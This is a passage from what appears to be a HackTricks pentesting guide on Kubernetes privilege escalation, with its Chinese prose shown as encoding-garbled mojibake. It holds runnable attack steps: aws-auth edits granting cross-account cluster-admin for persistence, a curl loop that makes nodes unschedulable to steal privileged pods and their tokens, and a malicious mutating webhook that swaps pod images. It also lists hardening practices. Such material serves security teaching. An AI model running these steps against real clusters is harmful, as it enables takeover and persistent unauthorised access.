eksctl create iamidentitymapping --cluster Testing --region us-east-1 --arn arn:aws:iam::123456789098:role/SomeRoleTestName --group "system:masters" --no-duplicate-arns

# Modify it
kubectl edit -n kube-system configmap/aws-auth
## You can modify it to even give access to users from other accounts
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters
mapUsers: |
- userarn: arn:aws:iam::098765432123:user/SomeUserTestName
username: admin
groups:
- system:masters
```
{% endcode %}

{% hint style="warning" %}
æ‚¨å¯ä»¥ä½¿ç”¨ **`aws-auth`** è¿›è¡Œ **æŒä¹…æ€§**ï¼Œä»¥ä¾¿ä» **å…¶ä»–è´¦æˆ·** è®¿é—®ç”¨æˆ·ã€‚

ç„¶è€Œï¼Œ`aws --profile other_account eks update-kubeconfig --name <cluster-name>` **åœ¨ä¸åŒè´¦æˆ·ä¸­ä¸èµ·ä½œç”¨**ã€‚ä½†å®é™…ä¸Šï¼Œå¦‚æœæ‚¨å°†é›†ç¾¤çš„ ARN æ”¾å…¥è€Œä¸ä»…ä»…æ˜¯åç§°ï¼Œ`aws --profile other_account eks get-token --cluster-name arn:aws:eks:us-east-1:123456789098:cluster/Testing` æ˜¯å¯ä»¥å·¥ä½œçš„ã€‚\
è¦ä½¿ `kubectl` å·¥ä½œï¼Œåªéœ€ç¡®ä¿ **é…ç½®** å—å®³è€…çš„ kubeconfigï¼Œå¹¶åœ¨ aws exec å‚æ•°ä¸­æ·»åŠ  `--profile other_account_role`ï¼Œè¿™æ · kubectl å°†ä½¿ç”¨å…¶ä»–è´¦æˆ·çš„é…ç½®æ–‡ä»¶æ¥è·å–ä»¤ç‰Œå¹¶è”ç³» AWSã€‚
{% endhint %}

### åœ¨ GKE ä¸­æå‡æƒé™

æœ‰ **2 ç§æ–¹æ³•å°† K8s æƒé™åˆ†é…ç»™ GCP ä¸»ä½“**ã€‚åœ¨ä»»ä½•æƒ…å†µä¸‹ï¼Œä¸»ä½“è¿˜éœ€è¦æƒé™ **`container.clusters.get`** ä»¥ä¾¿èƒ½å¤Ÿè·å–è®¿é—®é›†ç¾¤çš„å‡­æ®ï¼Œæˆ–è€…æ‚¨éœ€è¦ **ç”Ÿæˆè‡ªå·±çš„ kubectl é…ç½®æ–‡ä»¶**ï¼ˆè¯·éµå¾ªä¸‹ä¸€ä¸ªé“¾æ¥ï¼‰ã€‚

{% hint style="warning" %}
åœ¨ä¸ K8s api ç«¯ç‚¹äº¤è°ˆæ—¶ï¼Œ**GCP èº«ä»½éªŒè¯ä»¤ç‰Œå°†è¢«å‘é€**ã€‚ç„¶åï¼ŒGCP é€šè¿‡ K8s api ç«¯ç‚¹å°†é¦–å…ˆ **æ£€æŸ¥ä¸»ä½“**ï¼ˆé€šè¿‡ç”µå­é‚®ä»¶ï¼‰ **æ˜¯å¦åœ¨é›†ç¾¤å†…æœ‰ä»»ä½•è®¿é—®æƒé™**ï¼Œç„¶åæ£€æŸ¥æ˜¯å¦é€šè¿‡ GCP IAM **æœ‰ä»»ä½•è®¿é—®æƒé™**ã€‚\
å¦‚æœ **ä»»ä½•** è¿™äº›ä¸º **çœŸ**ï¼Œä»–å°†ä¼š **å¾—åˆ°å›åº”**ã€‚å¦‚æœ **ä¸**ï¼Œå°†ä¼šç»™å‡ºä¸€ä¸ª **é”™è¯¯**ï¼Œå»ºè®®é€šè¿‡ **GCP IAM** æˆäºˆ **æƒé™**ã€‚
{% endhint %}

ç„¶åï¼Œç¬¬ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨ **GCP IAM**ï¼ŒK8s æƒé™æœ‰å…¶ **ç­‰æ•ˆçš„ GCP IAM æƒé™**ï¼Œå¦‚æœä¸»ä½“æ‹¥æœ‰å®ƒï¼Œåˆ™å¯ä»¥ä½¿ç”¨å®ƒã€‚

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md" %}
[gcp-container-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md)
{% endcontent-ref %}

ç¬¬äºŒç§æ–¹æ³•æ˜¯ **åœ¨é›†ç¾¤å†…åˆ†é… K8s æƒé™**ï¼Œé€šè¿‡å…¶ **ç”µå­é‚®ä»¶** è¯†åˆ«ç”¨æˆ·ï¼ˆåŒ…æ‹¬ GCP æœåŠ¡è´¦æˆ·ï¼‰ã€‚

### åˆ›å»º serviceaccounts ä»¤ç‰Œ

å¯ä»¥ **åˆ›å»º TokenRequests** (`serviceaccounts/token`) çš„ä¸»ä½“åœ¨ä¸ K8s api ç«¯ç‚¹äº¤è°ˆæ—¶ SAsï¼ˆä¿¡æ¯æ¥è‡ª [**è¿™é‡Œ**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/token\_request.rego)ï¼‰ã€‚

### ephemeralcontainers

å¯ä»¥ **`update`** æˆ– **`patch`** **`pods/ephemeralcontainers`** çš„ä¸»ä½“å¯ä»¥è·å¾— **å…¶ä»– pods çš„ä»£ç æ‰§è¡Œ**ï¼Œå¹¶å¯èƒ½é€šè¿‡æ·»åŠ å…·æœ‰ç‰¹æƒçš„ securityContext çš„ä¸´æ—¶å®¹å™¨ **çªç ´** åˆ°å…¶èŠ‚ç‚¹ã€‚

### ValidatingWebhookConfigurations æˆ– MutatingWebhookConfigurations

å¯¹ `validatingwebhookconfigurations` æˆ– `mutatingwebhookconfigurations` å…·æœ‰ `create`ã€`update` æˆ– `patch` ä»»ä½•åŠ¨è¯çš„ä¸»ä½“å¯èƒ½èƒ½å¤Ÿ **åˆ›å»ºè¿™æ ·çš„ webhookconfigurations** ä»¥ä¾¿èƒ½å¤Ÿ **æå‡æƒé™**ã€‚

æœ‰å…³ [`mutatingwebhookconfigurations` çš„ç¤ºä¾‹ï¼Œè¯·æŸ¥çœ‹æ­¤å¸–çš„æ­¤éƒ¨åˆ†](./#malicious-admission-controller)ã€‚

### æå‡æƒé™

æ­£å¦‚æ‚¨åœ¨ä¸‹ä¸€éƒ¨åˆ†ä¸­æ‰€è¯»åˆ°çš„ï¼š[**å†…ç½®ç‰¹æƒæå‡é¢„é˜²**](./#built-in-privileged-escalation-prevention)ï¼Œä¸»ä½“ä¸èƒ½æ›´æ–°æˆ–åˆ›å»ºè§’è‰²æˆ–é›†ç¾¤è§’è‰²ï¼Œè€Œä¸æ‹¥æœ‰è¿™äº›æ–°æƒé™ã€‚é™¤éä»–å¯¹ **`roles`** æˆ– **`clusterroles`** å…·æœ‰ **åŠ¨è¯ `escalate`**ã€‚\
ç„¶åä»–å¯ä»¥æ›´æ–°/åˆ›å»ºå…·æœ‰æ¯”ä»–æ‹¥æœ‰çš„æ›´å¥½æƒé™çš„æ–°è§’è‰²ã€é›†ç¾¤è§’è‰²ã€‚

### èŠ‚ç‚¹ä»£ç†

å…·æœ‰è®¿é—® **`nodes/proxy`** å­èµ„æºçš„ä¸»ä½“å¯ä»¥é€šè¿‡ Kubelet API **åœ¨ pods ä¸Šæ‰§è¡Œä»£ç **ï¼ˆæ ¹æ® [**æ­¤**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/nodes\_proxy.rego)ï¼‰ã€‚æœ‰å…³ Kubelet èº«ä»½éªŒè¯çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·è®¿é—®æ­¤é¡µé¢ï¼š

{% content-ref url="../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

æ‚¨å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°å¦‚ä½•é€šè¿‡ [**ä¸ Kubelet API æˆæƒäº¤è°ˆè·å– RCE çš„ç¤ºä¾‹**](../pentesting-kubernetes-services/#kubelet-rce)ã€‚

### åˆ é™¤ pods + æ— æ³•è°ƒåº¦çš„èŠ‚ç‚¹

å¯ä»¥ **åˆ é™¤ pods**ï¼ˆå¯¹ `pods` èµ„æºçš„ `delete` åŠ¨è¯ï¼‰ï¼Œæˆ– **é©±é€ pods**ï¼ˆå¯¹ `pods/eviction` èµ„æºçš„ `create` åŠ¨è¯ï¼‰ï¼Œæˆ– **æ›´æ”¹ pod çŠ¶æ€**ï¼ˆè®¿é—® `pods/status`ï¼‰å¹¶ä¸”å¯ä»¥ **ä½¿å…¶ä»–èŠ‚ç‚¹æ— æ³•è°ƒåº¦**ï¼ˆè®¿é—® `nodes/status`ï¼‰æˆ– **åˆ é™¤èŠ‚ç‚¹**ï¼ˆå¯¹ `nodes` èµ„æºçš„ `delete` åŠ¨è¯ï¼‰å¹¶æ§åˆ¶ä¸€ä¸ª pod çš„ä¸»ä½“ï¼Œå¯ä»¥ **ä»å…¶ä»–èŠ‚ç‚¹çªƒå– pods**ï¼Œä»¥ä¾¿å®ƒä»¬åœ¨ **è¢«æ”»é™·çš„** **èŠ‚ç‚¹** ä¸­ **æ‰§è¡Œ**ï¼Œæ”»å‡»è€…å¯ä»¥ **çªƒå–è¿™äº› pods çš„ä»¤ç‰Œ**ã€‚
```bash
patch_node_capacity(){
curl -s -X PATCH 127.0.0.1:8001/api/v1/nodes/$1/status -H "Content-Type: json-patch+json" -d '[{"op": "replace", "path":"/status/allocatable/pods", "value": "0"}]'
}

while true; do patch_node_capacity <id_other_node>; done &
#Launch previous line with all the nodes you need to attack

kubectl delete pods -n kube-system <privileged_pod_name>
```
{% endcode %}

### æœåŠ¡çŠ¶æ€ (CVE-2020-8554)

å¯ä»¥ **ä¿®æ”¹** **`services/status`** çš„ä¸»ä½“å¯ä»¥è®¾ç½® `status.loadBalancer.ingress.ip` å­—æ®µï¼Œä»¥åˆ©ç”¨ **æœªä¿®å¤çš„ CVE-2020-8554** å¹¶å‘èµ· **MiTM æ”»å‡»**ã€‚å¤§å¤šæ•°é’ˆå¯¹ CVE-2020-8554 çš„ç¼“è§£æªæ–½ä»…é˜²æ­¢ ExternalIP æœåŠ¡ï¼ˆæ ¹æ® [**è¿™ä¸ª**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/modify\_service\_status\_cve\_2020\_8554.rego)ï¼‰ã€‚

### èŠ‚ç‚¹å’Œ Pods çŠ¶æ€

å…·æœ‰ **`update`** æˆ– **`patch`** æƒé™çš„ä¸»ä½“å¯ä»¥ä¿®æ”¹æ ‡ç­¾ï¼Œä»¥å½±å“å¼ºåˆ¶æ‰§è¡Œçš„è°ƒåº¦çº¦æŸã€‚

## å†…ç½®ç‰¹æƒå‡çº§é˜²æŠ¤

Kubernetes å…·æœ‰ [å†…ç½®æœºåˆ¶](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping) æ¥é˜²æ­¢ç‰¹æƒå‡çº§ã€‚

è¯¥ç³»ç»Ÿç¡®ä¿ **ç”¨æˆ·æ— æ³•é€šè¿‡ä¿®æ”¹è§’è‰²æˆ–è§’è‰²ç»‘å®šæ¥æå‡å…¶æƒé™**ã€‚æ­¤è§„åˆ™çš„æ‰§è¡Œå‘ç”Ÿåœ¨ API çº§åˆ«ï¼Œå³ä½¿ RBAC æˆæƒè€…å¤„äºéæ´»åŠ¨çŠ¶æ€ï¼Œä¹Ÿæä¾›äº†ä¿æŠ¤ã€‚

è¯¥è§„åˆ™è§„å®š **ç”¨æˆ·åªèƒ½åˆ›å»ºæˆ–æ›´æ–°è§’è‰²ï¼Œå¦‚æœä»–ä»¬æ‹¥æœ‰è§’è‰²æ‰€åŒ…å«çš„æ‰€æœ‰æƒé™**ã€‚æ­¤å¤–ï¼Œç”¨æˆ·ç°æœ‰æƒé™çš„èŒƒå›´å¿…é¡»ä¸ä»–ä»¬å°è¯•åˆ›å»ºæˆ–ä¿®æ”¹çš„è§’è‰²çš„èŒƒå›´ä¸€è‡´ï¼šå¯¹äº ClusterRoles æ˜¯é›†ç¾¤èŒƒå›´å†…çš„ï¼Œæˆ–è€…å¯¹äº Roles æ˜¯é™åˆ¶åœ¨åŒä¸€å‘½åç©ºé—´ï¼ˆæˆ–é›†ç¾¤èŒƒå›´å†…ï¼‰ã€‚

{% hint style="warning" %}
ä¹‹å‰è§„åˆ™æœ‰ä¸€ä¸ªä¾‹å¤–ã€‚å¦‚æœä¸»ä½“å¯¹ **`roles`** æˆ– **`clusterroles`** å…·æœ‰ **åŠ¨è¯ `escalate`**ï¼Œä»–å¯ä»¥å¢åŠ è§’è‰²å’Œé›†ç¾¤è§’è‰²çš„æƒé™ï¼Œå³ä½¿ä»–è‡ªå·±æ²¡æœ‰è¿™äº›æƒé™ã€‚
{% endhint %}

### **è·å– & ä¿®æ”¹ RoleBindings/ClusterRoleBindings**

{% hint style="danger" %}
**æ˜¾ç„¶ï¼Œè¿™ä¸ªæŠ€æœ¯ä¹‹å‰æœ‰æ•ˆï¼Œä½†æ ¹æ®æˆ‘çš„æµ‹è¯•ï¼Œç”±äºå‰é¢éƒ¨åˆ†è§£é‡Šçš„åŸå› ï¼Œå®ƒç°åœ¨ä¸å†æœ‰æ•ˆã€‚å¦‚æœä½ æ²¡æœ‰æƒé™ï¼Œä½ æ— æ³•åˆ›å»º/ä¿®æ”¹è§’è‰²ç»‘å®šä»¥èµ‹äºˆè‡ªå·±æˆ–å…¶ä»–æœåŠ¡è´¦æˆ·ä¸€äº›æƒé™ã€‚**
{% endhint %}

åˆ›å»º Rolebindings çš„æƒé™å…è®¸ç”¨æˆ· **å°†è§’è‰²ç»‘å®šåˆ°æœåŠ¡è´¦æˆ·**ã€‚è¿™ä¸ªæƒé™å¯èƒ½å¯¼è‡´ç‰¹æƒå‡çº§ï¼Œå› ä¸ºå®ƒ **å…è®¸ç”¨æˆ·å°†ç®¡ç†å‘˜æƒé™ç»‘å®šåˆ°è¢«æ”»é™·çš„æœåŠ¡è´¦æˆ·**ã€‚

## å…¶ä»–æ”»å‡»

### Sidecar ä»£ç†åº”ç”¨

é»˜è®¤æƒ…å†µä¸‹ï¼ŒPods ä¹‹é—´çš„é€šä¿¡æ²¡æœ‰ä»»ä½•åŠ å¯†ã€‚ç›¸äº’è®¤è¯ï¼ŒåŒå‘ï¼ŒPod åˆ° Podã€‚

#### åˆ›å»ºä¸€ä¸ª sidecar ä»£ç†åº”ç”¨ <a href="#create-a-sidecar-proxy-app" id="create-a-sidecar-proxy-app"></a>

åˆ›å»ºä½ çš„ .yaml
```bash
kubectl run app --image=bash --command -oyaml --dry-run=client > <appName.yaml> -- sh -c 'ping google.com'
```
ç¼–è¾‘æ‚¨çš„ .yaml æ–‡ä»¶å¹¶æ·»åŠ æœªæ³¨é‡Šçš„è¡Œï¼š
```yaml
#apiVersion: v1
#kind: Pod
#metadata:
#  name: security-context-demo
#spec:
#  securityContext:
#    runAsUser: 1000
#    runAsGroup: 3000
#    fsGroup: 2000
#  volumes:
#  - name: sec-ctx-vol
#    emptyDir: {}
#  containers:
#  - name: sec-ctx-demo
#    image: busybox
command: [ "sh", "-c", "apt update && apt install iptables -y && iptables -L && sleep 1h" ]
securityContext:
capabilities:
add: ["NET_ADMIN"]
#   volumeMounts:
#   - name: sec-ctx-vol
#     mountPath: /data/demo
#   securityContext:
#     allowPrivilegeEscalation: true
```
æŸ¥çœ‹ä»£ç†çš„æ—¥å¿—ï¼š
```bash
kubectl logs app -C proxy
```
æ›´å¤šä¿¡æ¯è¯·è®¿é—®: [https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

### æ¶æ„ Admission Controller

Admission controller **åœ¨å¯¹è±¡æŒä¹…åŒ–ä¹‹å‰æ‹¦æˆªå¯¹ Kubernetes API æœåŠ¡å™¨çš„è¯·æ±‚**ï¼Œä½† **åœ¨è¯·æ±‚ç»è¿‡èº«ä»½éªŒè¯** **å’Œæˆæƒä¹‹å**ã€‚

å¦‚æœæ”»å‡»è€…ä»¥æŸç§æ–¹å¼æˆåŠŸ **æ³¨å…¥ä¸€ä¸ª Mutationg Admission Controller**ï¼Œä»–å°†èƒ½å¤Ÿ **ä¿®æ”¹å·²ç»é€šè¿‡èº«ä»½éªŒè¯çš„è¯·æ±‚**ã€‚è¿™å¯èƒ½å¯¼è‡´æƒé™æå‡ï¼Œå¹¶ä¸”é€šå¸¸èƒ½å¤Ÿåœ¨é›†ç¾¤ä¸­æŒä¹…åŒ–ã€‚

**ç¤ºä¾‹æ¥è‡ª** [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers):
```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```
æ£€æŸ¥çŠ¶æ€ä»¥æŸ¥çœ‹æ˜¯å¦å·²å‡†å¤‡å¥½ï¼š
```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```
![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format\&format=webp)

ç„¶åéƒ¨ç½²ä¸€ä¸ªæ–°çš„ podï¼š
```bash
kubectl run nginx --image nginx
kubectl get po -w
```
å½“æ‚¨çœ‹åˆ° `ErrImagePull` é”™è¯¯æ—¶ï¼Œè¯·ä½¿ç”¨ä»¥ä¸‹æŸ¥è¯¢æ£€æŸ¥é•œåƒåç§°ï¼š
```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```
![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format\&format=webp)

æ­£å¦‚æ‚¨åœ¨ä¸Šé¢çš„å›¾åƒä¸­çœ‹åˆ°çš„ï¼Œæˆ‘ä»¬å°è¯•è¿è¡Œé•œåƒ `nginx`ï¼Œä½†æœ€ç»ˆæ‰§è¡Œçš„é•œåƒæ˜¯ `rewanthtammana/malicious-image`ã€‚å‘ç”Ÿäº†ä»€ä¹ˆï¼ï¼ï¼Ÿ

#### Technicalities <a href="#heading-technicalities" id="heading-technicalities"></a>

`./deploy.sh` è„šæœ¬å»ºç«‹äº†ä¸€ä¸ªå˜æ›´çš„ webhook è®¤è¯æ§åˆ¶å™¨ï¼Œå®ƒæ ¹æ®å…¶é…ç½®è¡Œä¿®æ”¹å¯¹ Kubernetes API çš„è¯·æ±‚ï¼Œä»è€Œå½±å“è§‚å¯Ÿåˆ°çš„ç»“æœï¼š
```
patches = append(patches, patchOperation{
Op:    "replace",
Path:  "/spec/containers/0/image",
Value: "rewanthtammana/malicious-image",
})
```
The above snippet replaces the first container image in every pod with `rewanthtammana/malicious-image`.

## OPA Gatekeeper bypass

{% content-ref url="../kubernetes-opa-gatekeeper/kubernetes-opa-gatekeeper-bypass.md" %}
[kubernetes-opa-gatekeeper-bypass.md](../kubernetes-opa-gatekeeper/kubernetes-opa-gatekeeper-bypass.md)
{% endcontent-ref %}

## æœ€ä½³å®è·µ

### **ç¦ç”¨æœåŠ¡è´¦æˆ·ä»¤ç‰Œçš„è‡ªåŠ¨æŒ‚è½½**

* **Pods å’ŒæœåŠ¡è´¦æˆ·**ï¼šé»˜è®¤æƒ…å†µä¸‹ï¼Œpods ä¼šæŒ‚è½½æœåŠ¡è´¦æˆ·ä»¤ç‰Œã€‚ä¸ºäº†å¢å¼ºå®‰å…¨æ€§ï¼ŒKubernetes å…è®¸ç¦ç”¨æ­¤è‡ªåŠ¨æŒ‚è½½åŠŸèƒ½ã€‚
* **å¦‚ä½•åº”ç”¨**ï¼šåœ¨æœåŠ¡è´¦æˆ·æˆ– pods çš„é…ç½®ä¸­è®¾ç½® `automountServiceAccountToken: false`ï¼Œä» Kubernetes ç‰ˆæœ¬ 1.6 å¼€å§‹ã€‚

### **åœ¨ RoleBindings/ClusterRoleBindings ä¸­é™åˆ¶ç”¨æˆ·åˆ†é…**

* **é€‰æ‹©æ€§åŒ…å«**ï¼šç¡®ä¿ä»…å°†å¿…è¦çš„ç”¨æˆ·åŒ…å«åœ¨ RoleBindings æˆ– ClusterRoleBindings ä¸­ã€‚å®šæœŸå®¡è®¡å¹¶ç§»é™¤ä¸ç›¸å…³çš„ç”¨æˆ·ï¼Œä»¥ä¿æŒä¸¥æ ¼çš„å®‰å…¨æ€§ã€‚

### **ä½¿ç”¨ç‰¹å®šäºå‘½åç©ºé—´çš„è§’è‰²è€Œéé›†ç¾¤èŒƒå›´çš„è§’è‰²**

* **è§’è‰²ä¸ ClusterRoles**ï¼šä¼˜å…ˆä½¿ç”¨ Roles å’Œ RoleBindings æ¥å¤„ç†ç‰¹å®šäºå‘½åç©ºé—´çš„æƒé™ï¼Œè€Œä¸æ˜¯é€‚ç”¨äºæ•´ä¸ªé›†ç¾¤çš„ ClusterRoles å’Œ ClusterRoleBindingsã€‚è¿™ç§æ–¹æ³•æä¾›äº†æ›´ç»†çš„æ§åˆ¶ï¼Œå¹¶é™åˆ¶äº†æƒé™çš„èŒƒå›´ã€‚

### **ä½¿ç”¨è‡ªåŠ¨åŒ–å·¥å…·**

{% embed url="https://github.com/cyberark/KubiScan" %}

{% embed url="https://github.com/aquasecurity/kube-hunter" %}

{% embed url="https://github.com/aquasecurity/kube-bench" %}

## **å‚è€ƒæ–‡çŒ®**

* [**https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions**](https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions)
* [**https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1**](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1)
* [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨ Twitter ä¸Šå…³æ³¨** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
